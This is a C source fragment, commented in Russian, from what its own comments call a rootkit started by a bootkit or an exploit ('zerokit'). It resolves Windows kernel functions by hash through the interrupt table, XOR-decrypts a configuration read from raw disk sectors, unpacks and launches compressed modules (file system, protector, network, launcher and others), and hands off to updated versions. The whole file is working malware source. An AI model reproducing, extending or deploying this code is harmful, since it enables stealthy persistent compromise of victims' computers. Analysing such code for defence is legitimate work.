                                    if (!pCommonBlock->fncommon_wcscmp(pVolumeListItr->pVolumeInfo->devName, bootDevName)) {
                                        pGlobalBlock->pCommonBlock->pBootDiskInfo = pVolumeListItr->pVolumeInfo->pDiskInfo;
                                        break;
                                    }
                                    pVolumeListItr = (pvolume_list_entry_t)((PLIST_ENTRY)pVolumeListItr)->Flink;
                                } while (pVolumeListItr != pCommonBlock->pVolumesListHead);
                            }
                        }
                    }
                } while (0);

                if (handle1 != NULL) {
                    pCommonBlock->fnZwClose(handle1);
                }
                if (handle2 != NULL) {
                    pCommonBlock->fnZwClose(handle2);
                }
            }

            if (!pCommonBlock->fncommon_update(pGlobalBlock->pZerokitPack, pStartupInfo->pPrevZerokitPack)) {
                // Не возможно установить зерокит. Завершаем работу.

                // Здесь бы по-хорошему удалить наше тело из памяти, чтобы не было лишних расходов ресурсов системы.
                
                // Завершаем работу основного потока.
                pCommonBlock->fnPsTerminateSystemThread(STATUS_SUCCESS);
            }
            if (loadFromMem) {
#if DBG == 0
                fnExFreePoolWithTag(pGlobalBlock->pZerokitPack, LOADER_TAG);
                pGlobalBlock->pZerokitPack = NULL;
#endif // DBG == 0
            }
            else {
                // Загружаем конфигурацию с диска.
                pCommonBlock->fncommon_allocate_memory(pCommonBlock, &pCommonBlock->pConfig, sizeof(configuration_t), NonPagedPool);
                pCommonBlock->fncommon_dio_read_sector(pCommonBlock->pBootDiskInfo, pCommonBlock->pConfig, sizeof(configuration_t), pCommonBlock->bodySecOffset + pCommonBlock->zerokitHeader.sizeOfPack);
            }

            {
                uint8_t* ptr;
#if DBG
                pCommonBlock->fncommon_disable_wp();
#endif // DBG == 0

                // Загружаем конфиг с диска и дешифруем блок с настройками.
                ptr = (uint8_t*)pCommonBlock->pConfig + sizeof(pCommonBlock->pConfig->block_header);
                for (i = 0; i < sizeof(configuration_t) - sizeof(pCommonBlock->pConfig->block_header); ++i, ++ptr) {
                    *ptr ^= ((uint8_t*)pCommonBlock->pConfig)[i % sizeof(pCommonBlock->pConfig->block_header)];
                }
#if DBG
                pCommonBlock->fncommon_enable_wp();
#endif // DBG == 0
            }
        }

        fnExFreePoolWithTag(pStartupInfo, LOADER_TAG);
    }

#ifdef _SOLID_DRIVER

    mod_fsEntry(modBase, pGlobalBlock);
    mod_protectorEntry(modBase, pGlobalBlock);
    mod_tasksEntry(modBase, pGlobalBlock);
    mod_networkEntry(modBase, pGlobalBlock);
    mod_tcpipEntry(modBase, pGlobalBlock);
    mod_netcommEntry(modBase, pGlobalBlock);
    mod_userioEntry(modBase, pGlobalBlock);
    mod_launcherEntry(modBase, pGlobalBlock);
    mod_logicEntry(modBase, pGlobalBlock);

#else

    for (i = 0 ; i < 9; ++i) {
        ELzmaStatus st;
        pmod_header_t pModHeader;

        modBase += sizeof(mod_header_t) + ((pmod_header_t)modBase)->sizeOfMod;
        pModHeader = (pmod_header_t)modBase;

        if (pModHeader->flags & MODF_COMPRESSED) {
            uint8_t* modBuffer;

            // Распаковываем мод и передаём ему управление.

            pCommonBlock->fncommon_allocate_memory(pCommonBlock, &modBuffer, pModHeader->sizeOfModReal + sizeof(mod_header_t), NonPagedPool);
            if (pCommonBlock->fnlzma_decode(modBuffer + sizeof(mod_header_t), &pModHeader->sizeOfModReal, (uint8_t*)(modBase + sizeof(mod_header_t)), pModHeader->sizeOfMod, &st) != ERR_OK) {
                pCommonBlock->fnPsTerminateSystemThread(STATUS_SUCCESS);
            }
            // Копируем заголовок мода.
            __movsb(modBuffer, (uint8_t*)pModHeader, sizeof(mod_header_t));

            pModHeader = (pmod_header_t)modBuffer;
            fnmodEntryPoint = (FnmodEntryPoint)(modBuffer + pModHeader->entryPointRVA);
            fnmodEntryPoint((uintptr_t)modBuffer, pGlobalBlock);
        }
        else {
            fnmodEntryPoint = (FnmodEntryPoint)(modBase + pModHeader->entryPointRVA);
            fnmodEntryPoint(modBase, pGlobalBlock);
        }
    }

#endif

    // Освобождаем базовые ресурсы и передаём управление на новую версию
    {
        FnmodEntryPoint fnmodEntryPoint;
        pzerokit_header_t pZerokitHdr;

        fnExFreePoolWithTag(pCommonBlock->deviceStr, LOADER_TAG);
        fnExFreePoolWithTag(pCommonBlock->ntCurrVerKey, LOADER_TAG);
        fnExFreePoolWithTag(pCommonBlock->sysRootWord, LOADER_TAG);

        fnPsTerminateSystemThread = pCommonBlock->fnPsTerminateSystemThread;

        fnExFreePoolWithTag(pCommonBlock, LOADER_TAG);
        fnExFreePoolWithTag(pGlobalBlock, LOADER_TAG);

//        pPackBuffer = (PUCHAR)fnExAllocatePoolWithTag(0, pZerokitHdr->sizeOfPack + sizeof(exploit_startup_header_t), LOADER_TAG);
        pZerokitHdr = (pzerokit_header_t)(pGlobalBlock->pZerokitPack + sizeof(exploit_startup_header_t) + 1024 + 2);
        fnmodEntryPoint = (FnmodEntryPoint)((PUCHAR)pGlobalBlock->pModHdr + pGlobalBlock->pModHdr->entryPointRVA);
        // + 1 в данном случае значит, что запуск из памяти.
        fnmodEntryPoint((uintptr_t)(pGlobalBlock->pZerokitPack + sizeof(exploit_startup_header_t) + 1), (pvoid_t)(pCurrentPackBuffer - (loadFromMem ? sizeof(exploit_startup_header_t) : 0)));
    }

    // Завершаем работу основного потока.
    fnPsTerminateSystemThread(STATUS_SUCCESS);
}

/** Точка входа в модуль

    * modBase    адрес базы модуля в памяти
    * pHeader    в этом mod-е данный параметр имеет два значения:
        = 0 - загрузка с диска (загружается буткитом)
        > 0 - загрузка из памяти (эксплоит)
*/
NTSTATUS mod_commonEntry(uintptr_t modBase, pvoid_t param)
{
    IDTR idtr;
    uint8_t* kernBase = NULL;
#if _NON_STD_DRIVER && !defined(_WIN64)
    uintptr_t realModBase = modBase;
#endif
    HANDLE hThread = NULL;
    pstartup_info_t pStartupInfo;
    OBJECT_ATTRIBUTES fObjectAttributes;
    uint8_t* fncommon_main_thread = (uint8_t*)common_main_thread;    
    FnPsCreateSystemThread fnPsCreateSystemThread;
    FnExAllocatePoolWithTag fnExAllocatePoolWithTag;
    FnfindModuleBaseFromIDT fnfindModuleBaseFromIDT = findModuleBaseFromIDT;
    FnfindModuleBaseByInnerPtr fnfindModuleBaseByInnerPtr = findModuleBaseByInnerPtr;
    Fnpe_find_export_by_hash fnpe_find_export_by_hash = pe_find_export_by_hash;
    Fncommon_calc_hash fncommon_calc_hash = common_calc_hash;

    /**
        Если руткит запущен с помощью экплоита, или предыдущей версией руткита. то в param находится указатель на буфер с предыдущим руткитом,
        иначе, если руткит запущен буткитом, то там находится норме сектора, где находится тело буткита на загрузочном диске.
    */

#if _NON_STD_DRIVER && !defined(_WIN64)
    if (modBase & 1) {
        --realModBase;
#ifdef _WIN64
        if (modBase & 2) {
            realModBase -= 2;
        }
        realModBase += ((pzerokit_header_t)(realModBase + 1024 + 2))->sizeOfBootkit;
        realModBase += ((pmods_pack_header_t)realModBase)->sizeOfPack + (sizeof(mods_pack_header_t) << 1);
#else
        realModBase += ((pzerokit_header_t)(realModBase + 1024 + 2))->sizeOfBootkit + sizeof(mods_pack_header_t);
#endif // _WIN64
    }

    realModBase = realModBase - *(uint32_t*)realModBase;
    (uint8_t*)fnfindModuleBaseFromIDT += realModBase;
    (uint8_t*)fnfindModuleBaseByInnerPtr += realModBase;
    (uint8_t*)fnpe_find_export_by_hash += realModBase;
    (uint8_t*)fncommon_calc_hash += realModBase;
    fncommon_main_thread += realModBase;
#endif

    __sidt(&idtr);

    kernBase = fnfindModuleBaseFromIDT(&idtr, PsCreateSystemThread_Hash, (void**)&fnPsCreateSystemThread, fnfindModuleBaseByInnerPtr, fnpe_find_export_by_hash, fncommon_calc_hash);
    fnExAllocatePoolWithTag = fnpe_find_export_by_hash(kernBase, ExAllocatePoolWithTag_Hash, fncommon_calc_hash);

    pStartupInfo = fnExAllocatePoolWithTag(NonPagedPool, sizeof(startup_info_t), LOADER_TAG);

#ifdef _WIN64
    if (modBase & 2) {
        pStartupInfo->pPrevZerokitPack = NULL;
        modBase -= 2;
    }
    else
#endif
    {
        pStartupInfo->pPrevZerokitPack = param;
    }

    pStartupInfo->pCurrZerokitPack = (pvoid_t)modBase;

    InitializeObjectAttributes(&fObjectAttributes, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
    fnPsCreateSystemThread(&hThread, /*0x001F03FF*/THREAD_ALL_ACCESS, &fObjectAttributes, 0, 0, (PKSTART_ROUTINE)fncommon_main_thread, (pvoid_t)pStartupInfo);

    return STATUS_SUCCESS;
}
